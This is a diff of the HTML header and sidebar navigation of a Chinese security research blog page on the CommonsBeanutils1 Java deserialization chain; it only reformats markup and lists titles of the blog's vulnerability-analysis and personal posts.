@@ -1,385 +1,1029 @@
-<!doctype html><html lang=zh-cn class="js csstransforms3d"><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.122.0"><meta name=description content="记录一些学习和生活日常"><meta name=author content="darkmoon"><link rel=icon href=/images/favicon.png type=image/png><title>CommonsBeanutils1 Chain - chestnut's blog</title>
-<link href=/css/nucleus.css?1706695144 rel=stylesheet><link href=/css/fontawesome-all.min.css?1706695144 rel=stylesheet><link href=/css/hybrid.css?1706695144 rel=stylesheet><link href=/css/featherlight.min.css?1706695144 rel=stylesheet><link href=/css/perfect-scrollbar.min.css?1706695144 rel=stylesheet><link href=/css/auto-complete.css?1706695144 rel=stylesheet><link href=/css/atom-one-dark-reasonable.css?1706695144 rel=stylesheet><link href=/css/theme.css?1706695144 rel=stylesheet><link href=/css/tabs.css?1706695144 rel=stylesheet><link href=/css/hugo-theme.css?1706695144 rel=stylesheet><link href=/css/theme-blue.css?1706695144 rel=stylesheet><script src=/js/dayjs.min.js?1706695144></script><script src=/js/jquery-3.3.1.min.js?1706695144></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-F5TRJPEVXY"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F5TRJPEVXY")</script><style>:root #header+#content>#left>#rlblock_left{display:none!important}</style></head><body data-url=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/><nav id=sidebar class=showVisitedLinks><div id=header-wrapper><div id=header><a id=logo href=/zh-cn><svg id="grav-logo" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 285.1 69.9"><g><path d="M35 0c9.6.0 17.9 3.4 24.7 10.3C66.5 17.1 70 25.3 70 35s-3.4 17.9-10.3 24.7C52.9 66.5 44.7 70 35 70c-9.7.0-17.9-3.4-24.7-10.3C3.4 52.8.0 44.6.0 34.9.0 25.3 3.4 17 10.3 10.2 17.1 3.4 25.3.0 35 0zM22.3 63.7c.3-7.4.3-14.7.0-22.1-2.1-.4-4-.4-5.9.0-.2.8-.2 2.5-.1 4.9.1 2.3.0 3.9-.3 4.8-1.7-.6-2.7-2.1-3.1-4.6-.1-.7-.1-3.3-.1-8 0-14.5-.1-23-.3-25.6-3.6 4.1-5.6 7-5.9 8.5v10.9c0 4.5.1 8.1.2 10.9.0.4.0 1.3-.1 2.8-.1 1.2.0 2.1.1 2.6.1.6 1.1 2.1 2.8 4.7C13.2 58.7 17.5 62.2 22.3 63.7zm22.3 1.7c.3-5 .2-12.9-.1-23.6-2.1-.3-4.1-.3-5.9.0-.2 2-.2 5.1-.1 9.5.1 4.3.0 7.5-.1 9.5-2.9.4-5 .3-6.2-.1-.2-5.6-.2-15.2-.1-28.7.1-12.4.0-21.8-.3-28.3-2.4.1-4.3.6-5.7 1.3-.1 7.7-.2 17.7-.1 30.1.0 16.5.0 26.6.0 30.3 2.3 1.1 5.4 1.7 9.4 1.7C38.9 66.9 42.1 66.4 44.6 65.4zM48.1 64.1c9.7-4.6 15.7-12 18-22.2-1.8-.2-3.8-.3-6.1-.3-1.6 3.9-2.6 6.3-3.2 7.2-1.1 1.7-2 2.5-2.7 2.5C54 46 54 39.1 54 30.5c0-11.5.0-18.4.0-20.9-1.4-1.4-3.3-2.5-5.7-3.4C48.1 6.3 48 6.4 48 6.7c0 3.5.0 13.1.0 28.8C47.9 47.2 48 56.8 48.1 64.1z"/></g><g><path d="M116.6 51.3h-29c-.5.0-.9-.1-1.3-.2-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1s-.2-.8-.2-1.3V16.3h6.3V45h25.8v6.3z"/><path d="M154.8 51.3h-22.9c-.9.0-1.8-.2-2.9-.5-1-.3-2-.8-2.9-1.5s-1.6-1.6-2.2-2.8c-.6-1.1-.9-2.5-.9-4.2V19.5c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1s.6-.5 1-.7.8-.2 1.3-.2h28.6v6.3h-25.4v19.8c0 .8.2 1.5.7 1.9s1.1.7 1.9.7h22.9v6.2zM151.9 37h-20v-6.4h20V37z"/><path d="M197.3 51.3H191v-8.6h-22.3v8.6h-6.3V33.8c0-2.6.4-4.9 1.3-7.1s2.1-4 3.7-5.5 3.4-2.8 5.5-3.6c2.1-.9 4.5-1.3 7-1.3h14.3c.4.0.9.1 1.2.2.4.2.7.4 1 .7s.5.6.7 1 .2.8.2 1.2V51.3zM168.7 36.4H191V22.6h-11.2c-.2.0-.6.0-1.2.1s-1.4.2-2.2.4c-.8.2-1.7.6-2.6 1-.9.5-1.8 1.1-2.5 2-.8.8-1.4 1.9-1.9 3.1-.5 1.2-.7 2.8-.7 4.5v2.7z"/><path d="M241.7 28.1c0 1.4-.2 2.7-.5 3.9-.4 1.1-.8 2.1-1.5 3-.6.9-1.3 1.6-2.1 2.2-.8.6-1.6 1.1-2.5 1.5s-1.8.7-2.6.9c-.9.2-1.7.3-2.5.3l13.3 11.5h-9.8l-13.2-11.5h-4.6v-6.3H230c.8-.1 1.5-.2 2.2-.5s1.2-.6 1.7-1.1.9-1 1.1-1.6c.3-.6.4-1.4.4-2.2v-4c0-.4.0-.6-.1-.8s-.2-.3-.3-.4c-.1-.1-.3-.1-.4-.2-.2.0-.3.0-.4.0h-20.9v28.7H207v-32c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7s.8-.2 1.3-.2H234c1.4.0 2.6.3 3.6.8s1.8 1.2 2.4 1.9c.6.8 1 1.6 1.3 2.5s.4 1.7.4 2.5v4z"/><path d="M285.1 48.6c0 .5-.1.9-.3 1.3s-.4.7-.7 1-.6.5-1 .7-.8.2-1.2.2-.8-.1-1.2-.2-.8-.4-1.1-.7l-23.2-24.2v24.7h-6.3V19c0-.7.2-1.2.5-1.8.4-.5.8-.9 1.4-1.2.6-.2 1.2-.3 1.9-.2s1.2.4 1.6.9l23.2 24.2V16.3h6.3V48.6z"/></g></svg></a></div><div class=searchbox><label for=search-by><i class="fas fa-search"></i></label>
+<!doctype html><html lang=zh-cn class="js csstransforms3d">
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=generator content="Hugo 0.89.4">
+<meta name=description content="记录一些学习和生活日常">
+<meta name=author content="darkmoon">
+<link rel=icon href=/images/favicon.png type=image/png>
+<title>CommonsBeanutils1 Chain - chestnut's blog</title>
+<link href=/css/nucleus.css?1706695571 rel=stylesheet>
+<link href=/css/fontawesome-all.min.css?1706695571 rel=stylesheet>
+<link href=/css/hybrid.css?1706695571 rel=stylesheet>
+<link href=/css/featherlight.min.css?1706695571 rel=stylesheet>
+<link href=/css/perfect-scrollbar.min.css?1706695571 rel=stylesheet>
+<link href=/css/auto-complete.css?1706695571 rel=stylesheet>
+<link href=/css/atom-one-dark-reasonable.css?1706695571 rel=stylesheet>
+<link href=/css/theme.css?1706695571 rel=stylesheet>
+<link href=/css/tabs.css?1706695571 rel=stylesheet>
+<link href=/css/hugo-theme.css?1706695571 rel=stylesheet>
+<link href=/css/theme-blue.css?1706695571 rel=stylesheet>
+<script src=/js/dayjs.min.js?1706695571></script>
+<script src=/js/jquery-3.3.1.min.js?1706695571></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F5TRJPEVXY"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-F5TRJPEVXY')</script>
+<style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
+</head>
+<body data-url=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/>
+<nav id=sidebar class=showVisitedLinks>
+<div id=header-wrapper>
+<div id=header>
+<a id=logo href=/zh-cn><svg id="grav-logo" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 285.1 69.9"><g><path d="M35 0c9.6.0 17.9 3.4 24.7 10.3C66.5 17.1 70 25.3 70 35s-3.4 17.9-10.3 24.7C52.9 66.5 44.7 70 35 70c-9.7.0-17.9-3.4-24.7-10.3C3.4 52.8.0 44.6.0 34.9.0 25.3 3.4 17 10.3 10.2 17.1 3.4 25.3.0 35 0zM22.3 63.7c.3-7.4.3-14.7.0-22.1-2.1-.4-4-.4-5.9.0-.2.8-.2 2.5-.1 4.9.1 2.3.0 3.9-.3 4.8-1.7-.6-2.7-2.1-3.1-4.6-.1-.7-.1-3.3-.1-8 0-14.5-.1-23-.3-25.6-3.6 4.1-5.6 7-5.9 8.5v10.9c0 4.5.1 8.1.2 10.9.0.4.0 1.3-.1 2.8-.1 1.2.0 2.1.1 2.6.1.6 1.1 2.1 2.8 4.7C13.2 58.7 17.5 62.2 22.3 63.7zm22.3 1.7c.3-5 .2-12.9-.1-23.6-2.1-.3-4.1-.3-5.9.0-.2 2-.2 5.1-.1 9.5.1 4.3.0 7.5-.1 9.5-2.9.4-5 .3-6.2-.1-.2-5.6-.2-15.2-.1-28.7.1-12.4.0-21.8-.3-28.3-2.4.1-4.3.6-5.7 1.3-.1 7.7-.2 17.7-.1 30.1.0 16.5.0 26.6.0 30.3 2.3 1.1 5.4 1.7 9.4 1.7C38.9 66.9 42.1 66.4 44.6 65.4zM48.1 64.1c9.7-4.6 15.7-12 18-22.2-1.8-.2-3.8-.3-6.1-.3-1.6 3.9-2.6 6.3-3.2 7.2-1.1 1.7-2 2.5-2.7 2.5C54 46 54 39.1 54 30.5c0-11.5.0-18.4.0-20.9-1.4-1.4-3.3-2.5-5.7-3.4C48.1 6.3 48 6.4 48 6.7c0 3.5.0 13.1.0 28.8C47.9 47.2 48 56.8 48.1 64.1z"/></g><g><path d="M116.6 51.3h-29c-.5.0-.9-.1-1.3-.2-.4-.2-.7-.4-1-.7-.3-.3-.5-.6-.7-1s-.2-.8-.2-1.3V16.3h6.3V45h25.8v6.3z"/><path d="M154.8 51.3h-22.9c-.9.0-1.8-.2-2.9-.5-1-.3-2-.8-2.9-1.5s-1.6-1.6-2.2-2.8c-.6-1.1-.9-2.5-.9-4.2V19.5c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1s.6-.5 1-.7.8-.2 1.3-.2h28.6v6.3h-25.4v19.8c0 .8.2 1.5.7 1.9s1.1.7 1.9.7h22.9v6.2zM151.9 37h-20v-6.4h20V37z"/><path d="M197.3 51.3H191v-8.6h-22.3v8.6h-6.3V33.8c0-2.6.4-4.9 1.3-7.1s2.1-4 3.7-5.5 3.4-2.8 5.5-3.6c2.1-.9 4.5-1.3 7-1.3h14.3c.4.0.9.1 1.2.2.4.2.7.4 1 .7s.5.6.7 1 .2.8.2 1.2V51.3zM168.7 36.4H191V22.6h-11.2c-.2.0-.6.0-1.2.1s-1.4.2-2.2.4c-.8.2-1.7.6-2.6 1-.9.5-1.8 1.1-2.5 2-.8.8-1.4 1.9-1.9 3.1-.5 1.2-.7 2.8-.7 4.5v2.7z"/><path d="M241.7 28.1c0 1.4-.2 2.7-.5 3.9-.4 1.1-.8 2.1-1.5 3-.6.9-1.3 1.6-2.1 2.2-.8.6-1.6 1.1-2.5 1.5s-1.8.7-2.6.9c-.9.2-1.7.3-2.5.3l13.3 11.5h-9.8l-13.2-11.5h-4.6v-6.3H230c.8-.1 1.5-.2 2.2-.5s1.2-.6 1.7-1.1.9-1 1.1-1.6c.3-.6.4-1.4.4-2.2v-4c0-.4.0-.6-.1-.8s-.2-.3-.3-.4c-.1-.1-.3-.1-.4-.2-.2.0-.3.0-.4.0h-20.9v28.7H207v-32c0-.4.1-.9.2-1.2.2-.4.4-.7.7-1 .3-.3.6-.5 1-.7s.8-.2 1.3-.2H234c1.4.0 2.6.3 3.6.8s1.8 1.2 2.4 1.9c.6.8 1 1.6 1.3 2.5s.4 1.7.4 2.5v4z"/><path d="M285.1 48.6c0 .5-.1.9-.3 1.3s-.4.7-.7 1-.6.5-1 .7-.8.2-1.2.2-.8-.1-1.2-.2-.8-.4-1.1-.7l-23.2-24.2v24.7h-6.3V19c0-.7.2-1.2.5-1.8.4-.5.8-.9 1.4-1.2.6-.2 1.2-.3 1.9-.2s1.2.4 1.6.9l23.2 24.2V16.3h6.3V48.6z"/></g></svg>
+</a>
+</div>
+<div class=searchbox>
+<label for=search-by><i class="fas fa-search"></i></label>
 <input data-search-input id=search-by type=search placeholder=搜索...>
-<span data-search-clear><i class="fas fa-times"></i></span></div><script type=text/javascript src=/js/lunr.min.js?1706695144></script><script type=text/javascript src=/js/auto-complete.js?1706695144></script><script type=text/javascript>var baseurl="https://www.ch35tnut.site/zh-cn"</script><script type=text/javascript src=/js/search.js?1706695144></script></div><section id=homelinks><ul><li><a class=padding href=/zh-cn><i class='fas fa-home'></i> 首页</a></li></ul></section><div class=highlightable><ul class=topics><li data-nav-id=/zh-cn/research/ title=安全研究 class="dd-item
-parent"><a href=/zh-cn/research/><b>X. </b>安全研究
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/iot/ title=Iot class=dd-item><a href=/zh-cn/research/iot/><b>X. </b>Iot
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/linux/ title=Linux class=dd-item><a href=/zh-cn/research/linux/><b>X. </b>Linux
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/linux/malware/ title=Malware class=dd-item><a href=/zh-cn/research/linux/malware/><b>X. </b>Malware
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/linux/suid/ title=Suid class=dd-item><a href=/zh-cn/research/linux/suid/>Suid
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/windows/ title=Windows class=dd-item><a href=/zh-cn/research/windows/><b>X. </b>Windows
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/windows/dll-inject/ title=Dll注入 class=dd-item><a href=/zh-cn/research/windows/dll-inject/><b>X. </b>Dll注入
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/windows/pe/ title=Pe class=dd-item><a href=/zh-cn/research/windows/pe/><b>X. </b>Pe
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/ title=协议 class=dd-item><a href=/zh-cn/research/protocol/><b>X. </b>协议
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/ntlm/ title="NTLM 协议" class=dd-item><a href=/zh-cn/research/protocol/ntlm/><b>X. </b>NTLM 协议
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/ title="Kerberos 协议" class=dd-item><a href=/zh-cn/research/protocol/kerberos/><b>X. </b>Kerberos 协议
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/protocol/kerberos/kerberos-in-windows/ title=Windows中的kerberos协议 class=dd-item><a href=/zh-cn/research/protocol/kerberos/kerberos-in-windows/><b>X. </b>Windows中的kerberos协议
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/ title=认证原理 class=dd-item><a href=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/>认证原理
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/protocol/netlogon/ title=Netlogon class=dd-item><a href=/zh-cn/research/protocol/netlogon/>Netlogon
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/ title=Web class="dd-item
-parent"><a href=/zh-cn/research/web/><b>X. </b>Web
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/web/java-deserialization/ title="Java Deserialization" class="dd-item
-parent"><a href=/zh-cn/research/web/java-deserialization/><b>X. </b>Java Deserialization
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ title="CommonsBeanutils1 Chain" class="dd-item active"><a href=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/>CommonsBeanutils1 Chain
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/web/java-deserialization/urldns/ title="JAVA URL DNS 研究" class=dd-item><a href=/zh-cn/research/web/java-deserialization/urldns/>JAVA URL DNS 研究
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE 分析" class=dd-item><a href=/zh-cn/research/web/php-filter-rce/>PHP Filter RCE 分析
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/research/code-audit/ title=代码审计 class=dd-item><a href=/zh-cn/research/code-audit/><b>X. </b>代码审计
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/research/code-audit/codeql/ title=Codeql class=dd-item><a href=/zh-cn/research/code-audit/codeql/><b>X. </b>Codeql
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/wireshark-185/ title="Wireshark 1.8.5代码审计" class=dd-item><a href=/zh-cn/research/code-audit/wireshark-185/>Wireshark 1.8.5代码审计
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/research/code-audit/news-server/ title="News Server审计" class=dd-item><a href=/zh-cn/research/code-audit/news-server/>News Server审计
-<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li><li data-nav-id=/zh-cn/vulnerability/ title=漏洞分析 class=dd-item><a href=/zh-cn/vulnerability/><b>X. </b>漏洞分析
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/ title="Windows CLFS EoP" class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/><b>X. </b>Windows CLFS EoP
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/ title=CVE-2023-28252 class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/>CVE-2023-28252
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/ title=CVE-2022-37969 class=dd-item><a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/>CVE-2022-37969
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/ title="CVE-2023-7028 GitLab Account Takeover" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/>CVE-2023-7028 GitLab Account Takeover
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/ title="CVE-2016-4437 Shiro 550 RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/>CVE-2016-4437 Shiro 550 RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/ title="CVE 2023 6553 Wordpress Backup Migration Plugin RCE" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/>CVE 2023 6553 Wordpress Backup Migration Plugin RCE
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/ title="CVE-2023-50164 Apache Struts RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/>CVE-2023-50164 Apache Struts RCE分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/ title="CVE-2023-21746 Windows NTLM Privilege Escalation" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/>CVE-2023-21746 Windows NTLM Privilege Escalation
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/ title="CVE-2020-17530 Apache Struts OGNL RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/>CVE-2020-17530 Apache Struts OGNL RCE分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/ title="CVE-2021-4034 Polkit 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/>CVE-2021-4034 Polkit 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/>CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-23121-afp-rce/ title="CVE-2022-23121 AFP RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-23121-afp-rce/>CVE-2022-23121 AFP RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/>CVE-2023-36563 Wordpad Info Disclosure 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/squid-dos/ title="Squid 拒绝服务漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/squid-dos/>Squid 拒绝服务漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/ title="CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/>CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/ title="CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/ title="CVE-2023-38545 Curl 堆溢出漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/>CVE-2023-38545 Curl 堆溢出漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/ title="CVE-2023-4863 Libwebp Rce 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/>CVE-2023-4863 Libwebp Rce 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/ title="CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/ title="瑞友天翼 Rce分析" class=dd-item><a href=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/>瑞友天翼 Rce分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/ title="CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/ title="CVE-2023-38148 Windows Ics Rce分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/>CVE-2023-38148 Windows Ics Rce分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/ title="CVE-2023-3519 Cirtix Gateway RCE分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/>CVE-2023-3519 Cirtix Gateway RCE分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/ title="CVE-2023-32315 Openfire 身份认证绕过漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/>CVE-2023-32315 Openfire 身份认证绕过漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/smartbi-rce/ title="Smartbi RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/smartbi-rce/>Smartbi RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/ title="CVE-2023-2825 Gitlab 路径穿越漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/>CVE-2023-2825 Gitlab 路径穿越漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/zero-logon/ title="Zero Logon 分析" class=dd-item><a href=/zh-cn/vulnerability/zero-logon/>Zero Logon 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/ title="CVE-2022-4223 PgAdmin RCE 分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/>CVE-2022-4223 PgAdmin RCE 分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/strapi-rce/ title="Strapi RCE 漏洞链分析" class=dd-item><a href=/zh-cn/vulnerability/strapi-rce/>Strapi RCE 漏洞链分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/ title="CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/>CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/ title="CVE-2021-3156 Sudo 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/>CVE-2021-3156 Sudo 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/>CVE-2023-28432 MinIO 信息泄露漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/ title="CVE-2023-23397 Outlook 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/>CVE-2023-23397 Outlook 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/proxy-not-shell/ title="Proxy Not Shell 利用链分析" class=dd-item><a href=/zh-cn/vulnerability/proxy-not-shell/>Proxy Not Shell 利用链分析
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" class=dd-item><a href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/>CVE-2021-40449 Win32k 权限提升漏洞分析
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/ title=生活随笔 class=dd-item><a href=/zh-cn/dailylife/><b>X. </b>生活随笔
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/dailylife/movies/ title=Movies class=dd-item><a href=/zh-cn/dailylife/movies/><b>X. </b>Movies
-<i class="fas fa-check read-icon"></i></a><ul><li data-nav-id=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/ title="2024 潜行" class=dd-item><a href=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/>2024 潜行
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/ title=吐槽 class=dd-item><a href=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/>吐槽
-<i class="fas fa-check read-icon"></i></a></li><li data-nav-id=/zh-cn/dailylife/2023-review-and-2024-outlook/ title=2023年总结和2024年展望 class=dd-item><a href=/zh-cn/dailylife/2023-review-and-2024-outlook/>2023年总结和2024年展望
-<i class="fas fa-check read-icon"></i></a></li></ul></li><li data-nav-id=/zh-cn/misc/ title=杂项 class=dd-item><a href=/zh-cn/misc/><b>X. </b>杂项
